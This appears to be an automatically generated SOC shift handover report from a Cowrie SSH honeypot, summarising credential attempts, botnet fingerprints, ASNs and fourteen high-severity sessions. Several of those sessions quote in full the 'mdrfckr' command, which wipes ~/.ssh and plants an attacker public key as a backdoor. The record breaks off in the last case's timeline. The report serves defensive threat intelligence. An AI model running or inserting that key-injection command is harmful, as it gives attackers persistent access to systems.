# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-28 |
| **Generated At** | 2026-05-28T08:06:15Z |
| **Shift Time** | 08:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **184** |
| Confirmed Threats | **166** |
| False Positives Filtered | **18** (9.8%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **15** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **170** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **51** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **25** |
| Unique Passwords | **33** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 7 |
| `admin` | 3 |
| `GET / HTTP/1.1` | 2 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept-Encoding: gzip` | 2 |
| `$4` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 2 |
| `*1` | `$4` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Huawei@1234` | `101.36.124.127` | 2026-05-28T05:46:47 |
| `root` | `3245gs5662d34` | `101.36.124.127` | 2026-05-28T05:46:49 |
| `root` | `ansible` | `101.36.124.127` | 2026-05-28T05:51:24 |
| `root` | `123456aB` | `101.36.124.127` | 2026-05-28T05:54:22 |
| `root` | `123123Aa` | `101.36.124.127` | 2026-05-28T05:55:54 |
| `root` | `abcd1234!` | `101.36.124.127` | 2026-05-28T05:59:04 |
| `root` | `qw12QW!@` | `112.104.154.26` | 2026-05-28T07:27:14 |
| `root` | `3245gs5662d34` | `112.104.154.26` | 2026-05-28T07:27:18 |
| `root` | `Support@2024` | `84.201.243.44` | 2026-05-28T07:36:23 |
| `root` | `3245gs5662d34` | `84.201.243.44` | 2026-05-28T07:36:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **184** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 49 |
| Go SSH scanner | 3 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 29 | 6 |
| `03a80b21afa8...` | Modern SSH client | 16 | 3 |
| `4e066189c3bb...` | Generic scanner | 1 | 1 |
| `dde267e50f82...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 29 | 6 | Mirai/variant |
| `03a80b21afa8...` | libssh | 16 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `112.104.154.26`, `101.36.124.127`, `84.201.243.44`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **24** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS26496` | GoDaddy.com, LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5b503cbd3ffa

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-05-28 05:46 |
| **Last Seen** | 2026-05-28 05:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 05:46:46` | `cowrie.session.connect` |
| `2026-05-28 05:46:46` | `cowrie.client.version` |
| `2026-05-28 05:46:46` | `cowrie.client.kex` |
| `2026-05-28 05:46:47` | `cowrie.login.success` |
| `2026-05-28 05:46:47` | `cowrie.session.params` |
| `2026-05-28 05:46:47` | `cowrie.command.input` |
| `2026-05-28 05:46:47` | `cowrie.command.failed` |
| `2026-05-28 05:46:47` | `cowrie.log.closed` |
| `2026-05-28 05:46:47` | `cowrie.session.params` |
| `2026-05-28 05:46:47` | `cowrie.command.input` |
| `2026-05-28 05:46:47` | `cowrie.session.file_download` |
| `2026-05-28 05:46:47` | `cowrie.log.closed` |
| `2026-05-28 05:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd9b6cdb9e0c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-05-28 05:46 |
| **Last Seen** | 2026-05-28 05:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 05:46:49` | `cowrie.session.connect` |
| `2026-05-28 05:46:49` | `cowrie.client.version` |
| `2026-05-28 05:46:49` | `cowrie.client.kex` |
| `2026-05-28 05:46:49` | `cowrie.login.success` |
| `2026-05-28 05:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-345b86f509d7

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-05-28 05:51 |
| **Last Seen** | 2026-05-28 05:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 05:51:23` | `cowrie.session.connect` |
| `2026-05-28 05:51:23` | `cowrie.client.version` |
| `2026-05-28 05:51:23` | `cowrie.client.kex` |
| `2026-05-28 05:51:24` | `cowrie.login.success` |
| `2026-05-28 05:51:24` | `cowrie.session.params` |
| `2026-05-28 05:51:24` | `cowrie.command.input` |
| `2026-05-28 05:51:24` | `cowrie.command.failed` |
| `2026-05-28 05:51:24` | `cowrie.log.closed` |
| `2026-05-28 05:51:24` | `cowrie.session.params` |
| `2026-05-28 05:51:24` | `cowrie.command.input` |
| `2026-05-28 05:51:24` | `cowrie.session.file_download` |
| `2026-05-28 05:51:24` | `cowrie.log.closed` |
| `2026-05-28 05:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93f93d3036e9

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-05-28 05:51 |
| **Last Seen** | 2026-05-28 05:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 05:51:26` | `cowrie.session.connect` |
| `2026-05-28 05:51:26` | `cowrie.client.version` |
| `2026-05-28 05:51:26` | `cowrie.client.kex` |
| `2026-05-28 05:51:27` | `cowrie.login.success` |
| `2026-05-28 05:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71a4dc784382

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-05-28 05:54 |
| **Last Seen** | 2026-05-28 05:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 05:54:21` | `cowrie.session.connect` |
| `2026-05-28 05:54:21` | `cowrie.client.version` |
| `2026-05-28 05:54:21` | `cowrie.client.kex` |
| `2026-05-28 05:54:22` | `cowrie.login.success` |
| `2026-05-28 05:54:22` | `cowrie.session.params` |
| `2026-05-28 05:54:22` | `cowrie.command.input` |
| `2026-05-28 05:54:22` | `cowrie.command.failed` |
| `2026-05-28 05:54:22` | `cowrie.log.closed` |
| `2026-05-28 05:54:22` | `cowrie.session.params` |
| `2026-05-28 05:54:22` | `cowrie.command.input` |
| `2026-05-28 05:54:22` | `cowrie.session.file_download` |
| `2026-05-28 05:54:22` | `cowrie.log.closed` |
| `2026-05-28 05:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77dac2a2e5d3

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-05-28 05:54 |
| **Last Seen** | 2026-05-28 05:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 05:54:24` | `cowrie.session.connect` |
| `2026-05-28 05:54:24` | `cowrie.client.version` |
| `2026-05-28 05:54:24` | `cowrie.client.kex` |
| `2026-05-28 05:54:25` | `cowrie.login.success` |
| `2026-05-28 05:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa594e9abebb

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-05-28 05:55 |
| **Last Seen** | 2026-05-28 05:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 05:55:54` | `cowrie.session.connect` |
| `2026-05-28 05:55:54` | `cowrie.client.version` |
| `2026-05-28 05:55:54` | `cowrie.client.kex` |
| `2026-05-28 05:55:54` | `cowrie.login.success` |
| `2026-05-28 05:55:54` | `cowrie.session.params` |
| `2026-05-28 05:55:54` | `cowrie.command.input` |
| `2026-05-28 05:55:54` | `cowrie.command.failed` |
| `2026-05-28 05:55:55` | `cowrie.log.closed` |
| `2026-05-28 05:55:55` | `cowrie.session.params` |
| `2026-05-28 05:55:55` | `cowrie.command.input` |
| `2026-05-28 05:55:55` | `cowrie.session.file_download` |
| `2026-05-28 05:55:55` | `cowrie.log.closed` |
| `2026-05-28 05:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eca28a5b9743

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-05-28 05:55 |
| **Last Seen** | 2026-05-28 05:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 05:55:57` | `cowrie.session.connect` |
| `2026-05-28 05:55:57` | `cowrie.client.version` |
| `2026-05-28 05:55:57` | `cowrie.client.kex` |
| `2026-05-28 05:55:57` | `cowrie.login.success` |
| `2026-05-28 05:55:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeffc98a0e1a

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-05-28 05:59 |
| **Last Seen** | 2026-05-28 05:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 05:59:03` | `cowrie.session.connect` |
| `2026-05-28 05:59:03` | `cowrie.client.version` |
| `2026-05-28 05:59:03` | `cowrie.client.kex` |
| `2026-05-28 05:59:04` | `cowrie.login.success` |
| `2026-05-28 05:59:04` | `cowrie.session.params` |
| `2026-05-28 05:59:04` | `cowrie.command.input` |
| `2026-05-28 05:59:04` | `cowrie.command.failed` |
| `2026-05-28 05:59:04` | `cowrie.log.closed` |
| `2026-05-28 05:59:04` | `cowrie.session.params` |
| `2026-05-28 05:59:04` | `cowrie.command.input` |
| `2026-05-28 05:59:04` | `cowrie.session.file_download` |
| `2026-05-28 05:59:04` | `cowrie.log.closed` |
| `2026-05-28 05:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc4ee783a0cb

| Field | Detail |
|---|---|
| **Source IP** | `101.36.124[.]127` |
| **First Seen** | 2026-05-28 05:59 |
| **Last Seen** | 2026-05-28 05:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 05:59:06` | `cowrie.session.connect` |
| `2026-05-28 05:59:06` | `cowrie.client.version` |
| `2026-05-28 05:59:06` | `cowrie.client.kex` |
| `2026-05-28 05:59:07` | `cowrie.login.success` |
| `2026-05-28 05:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.124[.]127` to AbuseIPDB if not already reported
- [ ] Block `101.36.124[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb8883f7d9f9

| Field | Detail |
|---|---|
| **Source IP** | `112.104.154[.]26` |
| **First Seen** | 2026-05-28 07:27 |
| **Last Seen** | 2026-05-28 07:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 07:27:14` | `cowrie.session.connect` |
| `2026-05-28 07:27:14` | `cowrie.client.version` |
| `2026-05-28 07:27:14` | `cowrie.client.kex` |
| `2026-05-28 07:27:14` | `cowrie.login.success` |
| `2026-05-28 07:27:15` | `cowrie.session.params` |
| `2026-05-28 07:27:15` | `cowrie.command.input` |
| `2026-05-28 07:27:15` | `cowrie.command.failed` |
| `2026-05-28 07:27:15` | `cowrie.log.closed` |
| `2026-05-28 07:27:15` | `cowrie.session.params` |
| `2026-05-28 07:27:15` | `cowrie.command.input` |
| `2026-05-28 07:27:15` | `cowrie.session.file_download` |
| `2026-05-28 07:27:15` | `cowrie.log.closed` |
| `2026-05-28 07:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.104.154[.]26` to AbuseIPDB if not already reported
- [ ] Block `112.104.154[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7d2b544f824

| Field | Detail |
|---|---|
| **Source IP** | `112.104.154[.]26` |
| **First Seen** | 2026-05-28 07:27 |
| **Last Seen** | 2026-05-28 07:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 07:27:17` | `cowrie.session.connect` |
| `2026-05-28 07:27:17` | `cowrie.client.version` |
| `2026-05-28 07:27:17` | `cowrie.client.kex` |
| `2026-05-28 07:27:18` | `cowrie.login.success` |
| `2026-05-28 07:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.104.154[.]26` to AbuseIPDB if not already reported
- [ ] Block `112.104.154[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed15572cd7a0

| Field | Detail |
|---|---|
| **Source IP** | `84.201.243[.]44` |
| **First Seen** | 2026-05-28 07:36 |
| **Last Seen** | 2026-05-28 07:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 07:36:22` | `cowrie.session.connect` |
| `2026-05-28 07:36:22` | `cowrie.client.version` |
| `2026-05-28 07:36:22` | `cowrie.client.kex` |
| `2026-05-28 07:36:23` | `cowrie.login.success` |
| `2026-05-28 07:36:24` | `cowrie.session.params` |
| `2026-05-28 07:36:24` | `cowrie.command.input` |
| `2026-05-28 07:36:24` | `cowrie.command.failed` |
| `2026-05-28 07:36:24` | `cowrie.log.closed` |
